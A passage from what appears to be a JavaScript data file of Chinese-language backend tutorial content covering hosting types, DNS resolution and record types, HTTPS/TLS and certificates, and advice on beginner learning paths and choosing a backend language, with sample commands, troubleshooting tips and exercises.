      { level: '挑战', task: '购买一个域名（便宜的 .xyz 或 .top 域名只要十几块），配置 DNS 指向你的云服务器 IP，在服务器上起一个 Nginx 并配置 HTTPS（Let\'s Encrypt）', hint: 'Namecheap/阿里云买域名 → 添加 A 记录 → 服务器装 Nginx + certbot', answer: '完整的域名上线流程走一遍：买域 → 配 DNS → 服务器装 Nginx → 配置 server_name → certbot --nginx 自动获取证书 → 浏览器看到绿色小锁。这是每个后端都要掌握的实操技能。' },
    ],
  },

  // ============================================================
  // 11. What is hosting? / 托管是什么
  // ============================================================
  "aqMaEY8gkKMikiqleV5EP": {
    mentalModel: '托管就是给你的后端代码"找地方住"——共享托管是青旅（便宜但互相影响），VPS 是单间公寓（独享但要自己管），云服务是全季酒店（舒服但贵），Serverless 是按钟点房（按使用付费，不用管房间）。选什么样的"住处"取决于你的项目规模和预算。',
    sections: [
      { title: '五种托管方案完整对比', content: '1) 共享托管（Shared Hosting）\n代表：Bluehost、HostGator、阿里云虚拟主机\n价格：$3-10/月\n特点：一台服务器上跑几百个网站，共享 CPU/内存/IP。你只能通过面板（cPanel）操作，不能 SSH。PHP 为主，不支持 Node.js/Go 等。\n适合：纯静态页面、WordPress 博客\n不适合：任何现代后端技术栈\n\n2) VPS（Virtual Private Server，虚拟私有服务器）\n代表：DigitalOcean Droplet、Linode、Vultr、AWS Lightsail\n价格：$5-80/月（1GB 内存起）\n特点：你独占虚拟机的资源（不会被邻居影响），有 root 权限（想装什么装什么），需要自己运维（安全更新、备份、监控）。\n适合：个人项目、小型 SaaS、学习 Linux 运维\n不适合：需要自动伸缩的高流量服务\n\n3) 云服务（Cloud Provider - IaaS）\n代表：AWS EC2、Google Compute Engine、Azure VM、阿里云 ECS\n价格：按需付费，t3.micro 约 $8/月，但流量和存储另算\n特点：和 VPS 类似但生态更大——几百种附加服务（数据库/缓存/队列/监控）。弹性伸缩、多可用区、SLA 99.99%。\n适合：生产环境、需要高可用的业务\n\n4) PaaS（Platform as a Service，平台即服务）\n代表：Railway、Render、Fly.io、Heroku（已不流行）\n价格：Railway/Render 有免费额度，付费 $5-25/月起\n特点：git push 就部署，不用管服务器。自动 HTTPS、自动扩缩、环境变量管理。但灵活性受限（不能用自定义二进制、限制超时等）。\n适合：快速原型、小型 API、学习阶段\n\n5) Serverless（无服务器）\n代表：AWS Lambda、Cloudflare Workers、Vercel Functions\n价格：按请求次数和计算时间计费，低流量几乎免费\n特点：完全不用管服务器，代码以函数形式运行。冷启动有延迟（尤其 Java Lambda 可能 2-3 秒）。不适合长时间运行的任务（通常超时 15 秒-15 分钟）。\n适合：事件驱动任务、API Gateway 后端、定时任务\n不适合：WebSocket 长连接、复杂业务流程' },
      { title: '新手选择指南——按阶段推荐', content: '学习阶段（免费/几乎免费）：\n- Railway / Render：免费额度够学习和展示 demo\n- GitHub Pages + Vercel：纯前端免费，配合 Serverless Functions 做简单后端\n\n项目阶段（$5-20/月）：\n- 一台 VPS（DigitalOcean $6/月）+ Docker Compose 部署\n- 或继续用 Railway/Render 付费版（省运维精力）\n\n想学运维（$5-20/月 + 你的时间）：\n- 一台 VPS 上手动装 Linux + Nginx + MySQL + Node.js/Go\n- 自己配防火墙、SSL、备份、监控\n\n正式产品（根据需要）：\n- 初创公司：PaaS + 云数据库（快速迭代）\n- 有一定规模：云服务 + K8s / ECS（弹性伸缩）\n- 大公司：多云 + 混合云 + 自建数据中心\n\n核心原则：不要过早优化部署架构。先跑起来，有用户了再操心高可用。' },
    ],
    handsOn: [
      { title: '在本地一行命令启动 HTTP 服务（最小托管）', cmd: 'python3 -m http.server 8080 & sleep 1 && curl -s http://localhost:8080 | head -5', output: 'Serving HTTP on :: port 8080 (http://[::]:8080/) ...\n<!DOCTYPE HTML>\n<html>\n<head>\n...', explain: 'Python 一行命令就在 8080 端口起了一个 HTTP 文件服务器。这就是"托管"的最简形式——一个进程监听某个端口提供 HTTP 服务。任何能跑 Python 的机器都能"托管"这个服务。' },
    ],
    diagnosis: [
      { symptom: '部署到 VPS 后本地能 curl 通但外网访问不了', cause: 'VPS 防火墙/安全组默认只开放了 22(SSH) 端口，没有开放你应用的端口（如 3000/8080）。或应用监听在 127.0.0.1 而非 0.0.0.0。', fix: '1) 检查应用监听地址：netstat -tlnp | grep 端口，确认是 0.0.0.0:PORT 2) 云服务商控制台添加安全组规则放行端口 3) 检查系统防火墙：ufw allow PORT 4) curl localhost:PORT 确认服务正常运行。' },
      { symptom: 'PaaS 上部署后应用频繁重启（CrashLoopBackOff）', cause: '应用启动就崩溃——可能是环境变量缺失、数据库连接失败、端口绑定错误（PaaS 通常通过 PORT 环境变量指定端口）。', fix: '1) 查看 PaaS 平台的日志（build log + runtime log）2) 确保数据库连接字符串从环境变量读取 3) 确保应用监听 process.env.PORT 而非固定端口 4) 本地模拟 PaaS 环境变量先测试一遍。' },
    ],
    exercises: [
      { level: '基础', task: '列举出至少 4 种托管类型，并说出每种的代表服务商', hint: 'Shared / VPS / Cloud / PaaS / Serverless', answer: '共享托管：Bluehost。VPS：DigitalOcean。云服务：AWS EC2。PaaS：Railway/Render。Serverless：AWS Lambda/Vercel Functions。' },
      { level: '进阶', task: '在 DigitalOcean（或阿里云/腾讯云）上创建一台最低配的 VPS，SSH 登录后装 Nginx 并配置一个静态页面', hint: '创建 Droplet → SSH 登录 → apt install nginx → 修改 /var/www/html/index.html', answer: '选 Ubuntu 22.04，$4-6/月的最低配。创建后拿到 IP 和 root 密码。SSH 登录：ssh root@IP。apt update && apt install nginx -y。echo "<h1>Hello from VPS</h1>" > /var/www/html/index.html。浏览器访问 http://IP 即可看到。这是最经典的托管入门体验。' },
    ],
  },

  // ============================================================
  // 12. DNS / DNS 工作原理
  // ============================================================
  "hkxw9jPGYphmjhTjw8766": {
    mentalModel: 'DNS 是全球最大的"分布式电话本"——层级查询、层层缓存，把人类能读的域名翻译成机器能懂的 IP。查一次 DNS 就像一场接力赛：先去总台（根域）问，总台说"去 .com 部门"，再去 .com 部门问，"去 example 科"，最后在 example 科的权威档案里查到具体记录。',
    sections: [
      { title: 'DNS 解析全链路——从浏览器到 IP', content: '以查询 www.example.com 的 A 记录为例：\n\n第 0 步：浏览器缓存\nChrome 会缓存 DNS 结果几十秒（chrome://net-internals/#dns 可查看）。如果有缓存，直接返回，结束。\n\n第 1 步：操作系统缓存\n如果浏览器没缓存，查操作系统缓存。Mac 用 mDNSResponder 管理。hosts 文件在这层（因此 hosts 优先级高于 DNS 服务器）。\n\n第 2 步：本地 DNS 解析器（Stub Resolver）\n通常是你的路由器（192.168.1.1）或 ISP 提供的 DNS 服务器。向它发起查询请求。\n\n第 3 步：递归解析器（Recursive Resolver）\n本地 DNS 服务器收到请求后，如果是第一次查这个域名，开始递归查询：\n  a) 问根域名服务器："www.example.com 在哪？"\n     根服务器回答："不知道具体 IP，但 .com 的 NS 是 a.gtld-servers.net，去问它"（返回 .com TLD 服务器的 IP）\n  b) 问 .com TLD 服务器："www.example.com 在哪？"\n     TLD 服务器回答："example.com 的权威 DNS 是 a.iana-servers.net，去问它"（返回权威 DNS 的 IP）\n  c) 问权威 DNS 服务器："www.example.com 的 A 记录是什么？"\n     权威服务器回答："www.example.com 的 A 记录是 93.184.216.34，TTL 86400"\n\n第 4 步：缓存返回\n递归解析器把结果缓存（按 TTL），返回给客户端。下次查询直接从缓存拿。\n\n关键数据：典型解析链路 3-5 跳，首次查询 50-200ms，有缓存后 <1ms。全球有 13 组根服务器（用 Anycast 技术实际成千上万个实例）。' },
      { title: 'DNS 记录类型速查表', content: 'A（Address）：域名 → IPv4 地址\n例如：example.com. 3600 IN A 93.184.216.34\n\nAAAA（Quad-A）：域名 → IPv6 地址\n例如：example.com. 3600 IN AAAA 2606:2800:220:1:248:1893:25c8:1946\n\nCNAME（Canonical Name）：域名 → 另一个域名（别名）\n例如：www.example.com. 3600 IN CNAME example.com.\n注意：CNAME 和 A 记录不能同时存在（RFC 规范限制）。根域名（example.com）不能设 CNAME——但 CloudFlare 的 CNAME Flattening 解决了这个问题。\n\nMX（Mail Exchange）：邮件服务器\n例如：example.com. 3600 IN MX 10 mail.example.com.（数字是优先级，越小越高）\n\nTXT：任意文本\n常见用途：SPF（发邮件策略："v=spf1 include:_spf.google.com ~all"）、DKIM（邮件签名公钥）、域名验证（证明你拥有域名）\n\nNS（Name Server）：该域名的权威 DNS 服务器\n例如：example.com. 86400 IN NS a.iana-servers.net.\n\nSOA（Start of Authority）：域名的管理信息\n包含：主 DNS 服务器、管理员邮箱、序列号（从 DNS 同步用）、刷新间隔、重试间隔、过期时间、最小 TTL。\n\nPTR（Pointer）：反向 DNS——IP → 域名\n用于邮件服务器验证（检查发件 IP 的反向 DNS 是否匹配），非邮件场景基本不用。' },
      { title: 'DNS 排障工具箱和实战思路', content: '排障流程（用户说"网站打不开"）：\n\n1) 先确认是"网络问题"还是"DNS 问题"\n   ping 域名 → 如果不通但 ping IP 能通 → DNS 问题\n   ping 域名 → 如果返回 "cannot resolve" → DNS 严重故障\n\n2) 确认 DNS 服务器是否正常\n   nslookup 域名 8.8.8.8（Google DNS，最可靠的参照）\n   如果 8.8.8.8 能解析但你本地不行 → 你的 DNS 服务器有问题\n\n3) 确认域名状态\n   whois 域名 → 检查是否过期、是否被暂停\n\n4) 确认 DNS 配置\n   dig 域名 NS → 查权威 DNS 服务器\n   dig @权威DNS 域名 A → 直接问权威服务器（跳过缓存）\n\n5) 检查缓存污染\n   对比 dig @8.8.8.8 域名 和 dig @1.1.1.1 域名 的结果\n   如果不同 → 某个 DNS 缓存了错误的记录\n\n常备工具：dig（详细）、nslookup（简单）、whois（注册信息）、whatsmydns.net（全球 DNS 传播检查）' },
    ],
    handsOn: [
      { title: '用 dig +trace 追踪一次完整的解析过程', cmd: 'dig +trace +nodnssec github.com 2>&1', output: '; <<>> DiG 9.10.6 <<>> +trace github.com\n.           518400 IN NS  a.root-servers.net.\ncom.        172800 IN NS  a.gtld-servers.net.\ngithub.com. 86400  IN NS  dns1.p08.nsone.net.\ngithub.com. 60     IN A   140.82.113.3', explain: '+trace 模拟了一个完整的递归解析过程。第一段是根服务器列表，第二段是 .com TLD 服务器，第三段是 github.com 的权威 DNS，最后是 A 记录。注意 github.com 的 TTL 只有 60 秒——大网站为了灵活切换 IP 会把 TTL 设很低。' },
      { title: '对比不同公共 DNS 的解析速度', cmd: 'echo "Google DNS (8.8.8.8): " && dig @8.8.8.8 github.com | grep "Query time" && echo "Cloudflare DNS (1.1.1.1): " && dig @1.1.1.1 github.com | grep "Query time"', output: 'Google DNS (8.8.8.8):\n;; Query time: 28 msec\nCloudflare DNS (1.1.1.1):\n;; Query time: 12 msec', explain: 'Query time 是 DNS 服务器的响应耗时。1.1.1.1 通常比 8.8.8.8 快一些（Cloudflare 有全球最大的 Anycast 网络）。你的 ISP 默认 DNS 可能更慢——这就是为什么很多人换公共 DNS。' },
    ],
    diagnosis: [
      { symptom: '网站突然访问不了，ping 域名显示 "cannot resolve"，但昨天还能用', cause: '域名过期了、DNS 服务商故障、或域名注册状态被锁定（如未实名认证被 clientHold）。', fix: '1) whois 域名查到期日：Registry Expiry Date 2) 登录域名注册商控制台看域名状态（OK/clientHold/redemptionPeriod）3) 检查 DNS 服务商是否故障（如 Cloudflare/DNSPod 状态页）4) 应急：临时改客户端 hosts 文件把域名指向 IP。' },
      { symptom: 'dig 查域名返回了 IP 但 curl 显示的 IP 不一样', cause: '/etc/hosts 文件有静态映射、代理重定向、或 CDN/智能 DNS 根据来源 IP 返回不同结果。', fix: '1) cat /etc/hosts | grep 域名 检查是否存在静态映射 2) curl -v 看 * Trying IP... 确认实际连接的 IP 3) 换网络（如手机热点）对比解析结果——如果是 CDN 就近解析，不同网络会得到不同 IP。' },
      { symptom: '修改了 DNS 记录，但全球部分用户说还是指向旧 IP', cause: 'DNS 传播延迟——不同地区、不同 ISP 的递归 DNS 服务器缓存了旧记录，TTL 还没过期。', fix: '1) 用 whatsmydns.net 看全球传播状态（绿色=新IP，红色=旧IP）2) 下次修改 DNS 前先降 TTL 到 300（5分钟），改完后再恢复 3) 等待最长 48 小时全部生效 4) 无法加速：只能等旧缓存过期。' },
    ],
    exercises: [
      { level: '基础', task: '用 dig 查询 baidu.com 的所有 A 记录，数一数返回了几个 IP', hint: 'dig baidu.com A', answer: 'baidu.com 通常返回 2-3 个 IP 地址，这是 DNS 层面的负载均衡。同时注意观察 ANSWER SECTION 中的 TTL 值（百度通常设 600 秒 = 10 分钟）。' },
      { level: '进阶', task: '用 dig +trace 追踪 www.taobao.com 的解析链路，和 github.com 对比，看看解析路径有什么不同', hint: 'dig +trace www.taobao.com', answer: '淘宝的权威 DNS 是阿里云的（vip1.alidns.com 等），解析路径经过根→.com→alidns.com→IP。和 GitHub 结构类似但 DNS 服务商不同。注意淘宝因为 CDN+智能 DNS，不同地区解析到的 IP 完全不同。' },
      { level: '挑战', task: '修改本地 /etc/hosts 文件，搭建一个简单的 DNS 劫持实验：把 google.com 指向 127.0.0.1，然后解释为什么浏览器访问 google.com 显示的是本机服务', hint: 'sudo vi /etc/hosts → 添加 → ping 验证 → nslookup 对比（nslookup 不走 hosts）', answer: '/etc/hosts 中添加 127.0.0.1 google.com。ping google.com 返回 127.0.0.1（走了 hosts）。但 nslookup google.com 仍然返回真实 IP（nslookup 直接查 DNS 不看 hosts）。这说明 hosts 的优先级高于 DNS 但不同工具路径不同——理解了这一点，就懂了 DNS 劫持的原理和危害。' },
    ],
  },

  // ============================================================
  // 13. HTTPS / HTTPS
  // ============================================================
  "x-WBJjBd8u93ym5gtxGsR": {
    mentalModel: 'HTTPS = HTTP + "防窃听加密信封"（TLS）。没有 HTTPS 就像寄明信片——任何经手的邮递员都能读到内容。有了 HTTPS 就像把信装进带锁的铁盒里——只有收件人（目标服务器）能打开，中途即使被截获也只是一堆乱码。2024 年了，所有生产环境必须 HTTPS，没有例外。',
    sections: [
      { title: 'TLS 握手——建立加密通道的"舞蹈"', content: 'TLS 握手的目的：在不安全的网络上安全地协商出"一次性会话密钥"。\n\nTLS 1.3 握手（简化版，1-RTT）：\n\n第 1 步：Client Hello\n客户端发送：\n- 随机数 A\n- 支持的加密套件列表（TLS_AES_256_GCM_SHA384 等）\n- 支持的密钥交换算法（X25519 等）\n- SNI（Server Name Indication，告诉服务器要访问哪个域名——因为一个 IP 上可能托管多个 HTTPS 网站）\n\n第 2 步：Server Hello\n服务器返回：\n- 随机数 B\n- 选定的加密套件\n- 选定的密钥交换参数（公钥）\n- 证书（包含服务器公钥 + 域名 + CA 签名）\n- 证书验证信息\n- Finished 消息（包含握手的所有内容的哈希，防篡改）\n\n第 3 步：客户端验证 + 生成密钥\n- 验证证书链（CA 签名有效、域名匹配、未过期、未被吊销）\n- 用自己的密钥交换私钥 + 服务器的公钥 → 生成共享密钥\n- 用随机数 A + B + 共享密钥 → 派生会话密钥\n- 发送 Finished 消息\n\n之后所有数据用会话密钥对称加密（AES-256-GCM）。\n\n为什么这么设计？\n- 非对称加密（公钥/私钥）：只用于握手阶段的身份验证和密钥协商（慢但安全）\n- 对称加密（会话密钥）：握手后用于数据加密（快）\n- 混合使用 = 安全（非对称保证身份）+ 高效（对称保证速度）' },
      { title: '证书、CA 和信任链——为什么浏览器相信这个网站', content: '数字证书 = 网站的"身份证"，由 CA（证书颁发机构）签发。\n\n证书包含：\n- Subject（CN = 域名）\n- Issuer（谁签发的，CA 名称）\n- Validity（有效期：Not Before / Not After）\n- Public Key（服务器公钥）\n- Signature（CA 的数字签名，证明"我验证过这个网站确实拥有这个域名"）\n\n证书链：\n服务器证书 → 中间 CA 证书 → 根 CA 证书（预置在操作系统/浏览器里）\n浏览器按链验证：根 CA（已信任）→ 验中间 CA 签名 → 验服务器证书签名。任何一环失败 = 浏览器显示不安全警告。\n\n证书类型：\n- DV（Domain Validation，域名验证）：Let\'s Encrypt 就是这种。只需证明你控制这个域名（通过 DNS 或 HTTP 挑战），几分钟签发。\n- OV（Organization Validation）：验证组织身份，证书里显示公司名。\n- EV（Extended Validation）：最严格验证，浏览器地址栏显示公司名（曾经绿色，现在大多浏览器去掉了特殊显示）。\n- 通配符证书（Wildcard）：*.example.com 覆盖所有子域。\n- 自签名证书：自己给自己签发，浏览器会警告。仅限内网测试。' },
      { title: 'HTTPS 对后端实践的 6 个实际影响', content: '1) 证书管理自动化\n   不要手动管理证书！用 certbot（Let\'s Encrypt）或 Caddy（自动 HTTPS）。证书有效期 90 天，必须自动续签。\n\n2) HSTS（HTTP Strict Transport Security）\n   响应头：Strict-Transport-Security: max-age=63072000; includeSubDomains; preload\n   告诉浏览器"以后只走 HTTPS"。一旦设置，浏览器拒绝 HTTP 访问。可以申请加入浏览器预加载列表（hstspreload.org）。\n\n3) 混合内容（Mixed Content）\n   HTTPS 页面中引用了 HTTP 资源（图片/JS/CSS）。浏览器行为：主动混合内容（JS/CSS/字体）→ 直接拦截。被动混合内容（图片/视频）→ 显示但地址栏锁不完整。\n   修复：所有资源用协议相对 URL（//cdn.example.com/img.png）或强制 HTTPS。\n\n4) SNI（Server Name Indication）\n   TLS 握手时客户端告诉服务器要访问哪个域名。这对虚拟主机至关重要——同一 IP 上多个 HTTPS 网站靠 SNI 区分。\n\n5) 性能影响\n   TLS 1.3 握手只增加 1 个 RTT。Session Resumption（缓存 TLS 会话）可以跳过握手。HTTP/2+ 的多路复用分摊了握手成本。总体上 HTTPS 开销只有 1-5%，远小于加密带来的安全收益。\n\n6) 证书透明度（Certificate Transparency）\n   所有公开信任的 CA 必须把签发记录提交到 CT 日志。你可以查到任何域名的证书签发历史（crt.sh）。这是防恶意签发证书的机制。' },
    ],
    handsOn: [
      { title: '查看网站的证书详细信息', cmd: 'echo | openssl s_client -connect github.com:443 -servername github.com 2>/dev/null | openssl x509 -noout -text | grep -E "Subject:|Issuer:|Not Before|Not After|DNS:"', output: 'Issuer: C=US, O=DigiCert, CN=DigiCert Global G2 TLS RSA4096\nSubject: CN=github.com\nNot Before: Mar 15 00:00:00 2024 GMT\nNot After: Mar 15 23:59:59 2025 GMT\nDNS:github.com, DNS:*.github.com', explain: 'GitHub 的证书由 DigiCert 签发，有效期一年。*.github.com 说明这是通配符证书（覆盖所有子域）。Issuer 是 CA，Subject 是网站身份。' },
      { title: '测试 TLS 版本和加密套件', cmd: 'curl -s -v https://github.com 2>&1 | grep -E "SSL|TLS|ALPN"', output: '* ALPN: curl offers h2,http/1.1\n* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384', explain: 'TLSv1.3 是最新协议，TLS_AES_256_GCM_SHA384 是选定的加密套件。AES-256-GCM 是美军标准的加密算法。整个协商过程在握手阶段完成，对应用层透明。' },
    ],
    diagnosis: [
      { symptom: '浏览器显示"您的连接不是私密连接"（NET::ERR_CERT_DATE_INVALID）', cause: '证书已过期。Let\'s Encrypt 证书有效期 90 天，过期后浏览器不再信任。', fix: '1) 检查证书到期日：openssl s_client -connect 域名:443 2>/dev/null | openssl x509 -noout -enddate 2) 如果使用 certbot：certbot renew --dry-run 测试续签 3) 设置 cron 定时任务自动续签：0 3 * * * certbot renew --quiet。' },
      { symptom: '浏览器显示 "NET::ERR_CERT_COMMON_NAME_INVALID"', cause: '证书签发的域名和你访问的域名不匹配。例如证书是 example.com 但访问的是 www.example.com（没配 www）。', fix: '1) 确认证书的 SAN（Subject Alternative Name）列表是否包含你用的域名：openssl s_client -connect 域名:443 | openssl x509 -noout -ext subjectAltName 2) 申请新证书时把 www 和裸域都加上 3) 或配 301 重定向到正确的域名。' },
      { symptom: 'curl 能正常访问但浏览器报证书错误', cause: 'curl 默认不验证证书（或用系统 CA 信任链），但浏览器有更严格的验证规则。常见于自签名证书或内部 CA 签发的证书。', fix: '1) curl -v 看 * SSL certificate verify 的结果 2) 用 mkcert 生成本地受信任证书（brew install mkcert && mkcert -install && mkcert localhost）3) 生产环境不要用自签名，用 Let\'s Encrypt 免费证书。' },
    ],
    exercises: [
      { level: '基础', task: '用 curl -v 分别访问一个 HTTP 和一个 HTTPS 网站，观察输出差异，找到 TLS 握手相关日志', hint: 'curl -v http://example.com vs curl -v https://example.com', answer: 'HTTPS 版本会多出 * Connected / * ALPN / * SSL connection using / * Server certificate 等日志。HTTP 版本只有简单的 Connected 后直接发请求。' },
      { level: '进阶', task: '用 openssl s_client 连接一个 HTTPS 网站，观察完整的证书链、加密套件协商过程', hint: 'echo | openssl s_client -connect baidu.com:443 -servername baidu.com -showcerts', answer: '输出中可以看到服务器返回的完整证书链（多层证书）。Certificate chain 部分有 2-3 段 BEGIN/END CERTIFICATE。同时可以看到协议版本、加密套件、Session-ID 等握手信息。' },
      { level: '挑战', task: '在自己本地项目中配置 HTTPS：用 mkcert 生成受信任的本地证书，配置到 Express/Nginx/Go 中，实现浏览器绿色小锁', hint: 'brew install mkcert → mkcert -install → mkcert localhost 127.0.0.1 → 生成的 .pem 和 -key.pem 配置到服务器', answer: 'Node.js: https.createServer({key, cert}, app).listen(443)。Nginx: ssl_certificate /path/to/localhost.pem; ssl_certificate_key /path/to/localhost-key.pem。Go: http.ListenAndServeTLS(":443", "cert.pem", "key.pem", handler)。配置好后浏览器访问 https://localhost 看到绿色锁。' },
    ],
  },

  // ============================================================
  // 14. Visit Beginner Friendly Version / 新手友好版
  // ============================================================
  "MfErpYwkJ0wiWJZEUVfrb": {
    mentalModel: '后端学习就像登山——山脚下有"新手步道"（Beginner Friendly），缆车直达半山腰看全景。别一上来就挑战北坡悬崖（完整路线图）。先走新手步道建立整体认知，知道"山上有什么"，再按需深入攀登。',
    sections: [
      { title: '新手版 vs 完整版路线图——帕累托法则（80/20）', content: '新手版只包含后端最核心的 20% 知识——但覆盖了日常工作中 80% 的场景。\n\n新手版包含：\n- 互联网基础（HTTP/DNS/域名/托管）\n- 挑选一门后端语言\n- Git 基本操作\n- 关系型数据库基础（SQL CRUD）\n- 简单 API 开发\n- 了解认证/缓存/安全的基本概念\n\n完整版新增：\n- 多种数据库深入（PostgreSQL/MySQL/MongoDB/Redis）\n- 消息队列（RabbitMQ/Kafka）\n- 容器化和编排（Docker/Kubernetes）\n- 微服务架构\n- 系统设计\n- 监控/CI-CD/云服务\n\n建议路径：新手版 2-3 周快速过完 → 做一个完整的 CRUD 项目 → 回头看完整版，挑当前项目能用上的深入。不要追求"学全"——地基不打牢就盖二楼会塌。' },
      { title: '三个"不要"原则', content: '1) 不要为了"看起来专业"而跳过基础——"我直接学微服务行不行？"→不行。你没写过单体应用，不知道微服务解决什么问题，学了也是空中楼阁。\n\n2) 不要在基础阶段就追求"学全"——路线图上有 150+ 个节点，你半年都学不完。前 3 个月只关注：一门语言 + 数据库 + API + Git。\n\n3) 不要只看不写——看了 10 篇 HTTP 教程不如用 curl 抓 10 个包。看了 5 本数据库书不如自己设计 5 张表并跑查询。\n\n黄金公式：学一个概念 → 写一段相关代码 → 遇到 bug → 解决 bug → 真正理解概念。跳过后两步等于白学。' },
      { title: '实际学习时间线参考', content: '第 1 周：互联网基础（HTTP/DNS/域名/托管），每天 2 小时\n第 2 周：选一门语言学基础语法（变量/函数/控制流），每天 3 小时\n第 3 周：Git 基本操作（clone/add/commit/push/branch/merge），每天 1 小时\n第 4-5 周：数据库基础（建表/CRUD/索引/JOIN），每天 2 小时\n第 6-8 周：用学到的语言+数据库做第一个 CRUD 项目（最多 2 周完成）\n\n两个月后，你应该能独立完成"从零搭建一个后端 API 并部署"——这才是真正的入门。之后再看完整路线图，选择下一个深入方向。' },
    ],
    diagnosis: [
      { symptom: '按完整路线图从头学到尾，3 个月还没写出一行 API 代码', cause: '追求学全而非学会——每个节点都想精通，导致永远在准备阶段。', fix: '1) 执行两遍法：第一遍每节点 15-30 分钟快速了解，第二遍项目驱动深入 2) 第 4 周必须完成一个 CRUD 项目 3) 允许只了解不精通——80% 的节点只需要知道概念。' },
      { symptom: '面试被问你做过什么项目答不出来', cause: '看教程和做项目的时间比例颠倒——应该是 3:7 而非 7:3。', fix: '1) 立即用已会的技能做一个完整项目推到 GitHub 2) 每个教程学完当天必须写对应的练习代码 3) 项目 README 写清楚技术栈和功能。' },
    ],
    exercises: [
      { level: '基础', task: '列出后端新手最应该优先学习的 6 样东西，按优先级排序', hint: '语言 / Git / 数据库 / HTTP / API / 一个项目', answer: '优先级顺序：1) HTTP 基础（理解请求-响应模型）2) 一门后端语言（基础语法）3) Git（版本控制）4) 数据库（SQL CRUD）5) API 开发（REST 接口）6) 做一个完整项目并部署。这六样按顺序学，每样学完都对应做一个小练习。' },
      { level: '进阶', task: '打开完整版后端路线图，标记出你认为"前 3 个月必须学"的节点和"可以一年后再学"的节点', hint: '核心节点一般是最左边的部分', answer: '前3月必须：互联网基础→选语言→Git→数据库（关系型）→API→认证基础→一个项目。一年后再学：微服务/消息队列/K8s/系统设计/多种数据库。原则：能让你做出项目的先学，锦上添花的后学。' },
    ],
  },

  // ============================================================
  // 15. Pick a Backend Language / 选一门后端语言
  // ============================================================
  "2f0ZO6GJElfZ2Eis28Hzg": {
    mentalModel: '选后端语言就像选一款车——没有"最好的车"，只有"最适合你的用车场景"的车。新手最常见的陷阱是"语言纠结症"——花 3 个月比较 Go vs Java vs Python 的差异，一行代码没写。记住：用任何主流语言都能成为优秀的后端工程师，选一个你写着顺手、岗位多的开始就好。',
    sections: [
      { title: '新手选语言的三维决策模型', content: '维度一：市场导向（最重要的维度）\n打开招聘网站（Boss 直聘/拉勾/LinkedIn），搜目标岗位：\n- 国内：Java 岗位 > Go > Python > Node.js > C# > PHP > Ruby\n- 北美：Node.js/Python > Go > Java > Ruby > Rust\n- 欧洲：Java > Node.js > Python > Go > PHP\n如果你目标是进大厂，选他们用得最多的语言——面试时你的语言经验直接对口。\n\n维度二：场景导向\n- 做 AI/数据：Python（生态无敌）\n- 做云原生/微服务：Go（Docker/K8s 都用 Go 写的）\n- 做企业系统（金融/ERP）：Java/C#（稳定、强类型、大团队友好）\n- 做创业 MVP/全栈：Node.js/Ruby on Rails（快速开发）\n- 做性能敏感/系统级：Rust（但新手不建议）\n\n维度三：个人偏好\n- 喜欢简洁语法？→ Go/Python\n- 喜欢 IDE 提示强大？→ Java/C#（静态类型）\n- 喜欢一种语言搞定前后端？→ Node.js（TypeScript）\n\n决策建议：如果三条都不确定，选 Go。原因：语法简单（25 个关键字）、编译快、部署简单（单文件）、云原生趋势、国内外岗位都在增长。' },
      { title: '第一门语言的"边际效应"', content: '重要认知：第一门语言决定的是"思维方式"，不是"终身职业绑定"。\n\n- 学了 Python → 理解动态类型、快速原型思维\n- 学了 Java → 理解强类型、面向对象、大型项目架构\n- 学了 Go → 理解简洁设计、并发模型、编译型性能\n\n但任何一门扎实学深了，转第二门语言只需要 2-4 周。因为：\n- 变量/循环/函数/递归 → 所有语言都一样\n- 数据库操作/HTTP API → 和语言无关\n- 学到的是"编程思维"而非"语法"\n\n所以不要纠结"选错了怎么办"——选一个开始写代码，比花时间纠结有价值 100 倍。' },
    ],
    diagnosis: [
      { symptom: '选语言纠结了 2 个月，Go/Java/Python/Node.js 反复比较还没动笔', cause: '语言选择恐惧症——误以为第一门语言是终身绑定。', fix: '1) 三维决策法：看岗位数、目标场景、写着是否顺手，任一明确就选 2) 设定 48 小时决策 deadline 3) 选好后不再看对比文章。' },
      { symptom: '学 Go 1 个月觉得 Java 岗位多，换 Java 2 周又想学 Python 做 AI', cause: '缺乏沉没成本意识——每次换语言，之前的时间投入全部浪费。', fix: '1) 承诺至少 3 个月不换语言 2) 用选定语言做出一个完整项目后再评估 3) 任何主流语言学深了都能找到好工作。' },
    ],
    exercises: [
      { level: '基础', task: '列出你正在学或打算学的后端语言，根据市场/场景/兴趣三个维度各写一条理由', hint: '打开招聘网站搜一搜目标岗位的真实需求', answer: '例如选 Go：1) 市场：国内云计算/微服务岗位大量要 Go 2) 场景：想做云原生后端开发 3) 兴趣：喜欢简洁语法和编译型语言的确定性。每个理由都要能说出具体依据。' },
      { level: '进阶', task: '用三种语言（各 5 行代码）实现同一个功能：读取一个 JSON 文件，解析其中的 name 字段并打印。对比代码风格差异', hint: 'Python: json.load / Go: json.Unmarshal / Node.js: JSON.parse + fs.readFileSync', answer: 'Python: data = json.load(open("file.json")); print(data["name"])。Go: var data struct{Name string}; json.Unmarshal(b, &data); fmt.Println(data.Name)（代码更长但类型安全）。Node.js: const data = JSON.parse(fs.readFileSync("file.json","utf8")); console.log(data.name)。对比后你会感受到不同语言的哲学。' },
    ],
  },

  // ============================================================
  // 16. 先精通一门语言并多做项目，再往下走
  // ============================================================
  "mI9Rq9IpLuMpn4sQT5vVw": {
    mentalModel: '学编程就像学游泳——你在岸上看再多教程、分析再多泳姿理论、记再多呼吸技巧，都不如跳下水扑腾 10 分钟。项目是"水"，教程是"游泳指南"。看完一章指南就下水，呛几口水（遇到 bug），在挣扎中真正学会。',
    sections: [
